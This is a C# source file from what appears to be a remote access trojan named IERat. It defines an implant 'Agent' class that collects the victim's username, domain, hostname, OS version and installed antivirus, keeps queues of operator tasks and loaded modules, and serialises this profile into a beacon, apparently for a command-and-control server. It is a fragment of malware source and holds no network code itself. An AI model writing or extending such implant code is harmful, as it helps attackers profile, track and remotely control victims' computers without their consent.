using IERat.lib;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Web.Script.Serialization;

namespace IERat
{
    public class Agent
    {
        public Agent()
        {
            ID = Guid.NewGuid();
            Username = Environment.UserName;
            Domain = Environment.UserDomainName;
            Hostname = Environment.MachineName;
            OSVersion = Utils.GetOS();
            AV = AVUtils.GetAV();
            AgentTasks = new Queue<TaskObject>();
            CompletedAgentTasks = new Queue<TaskObject>();
            Version = Assembly.GetExecutingAssembly().GetName().Version.ToString();
            Cwd = Directory.GetCurrentDirectory();
            LoadedModules = new Dictionary<String, object>();
        }
        public Guid ID { get; set; }
        public string Username { get; set; }
        public string Domain { get; set; }
        public string Hostname { get; set; }
        public string OSVersion { get; set; }
        public string AV { get; set; }

        public string Cwd { get; set; }
        public string Version { get; set; }
        public Queue<TaskObject> AgentTasks { get; set; }
        public Queue<TaskObject> CompletedAgentTasks { get; set; }
        public Dictionary<String, object> LoadedModules { get; set; }

        public string GenerateBeacon()
        {
            return new JavaScriptSerializer().Serialize(this);
        }      
    }
}




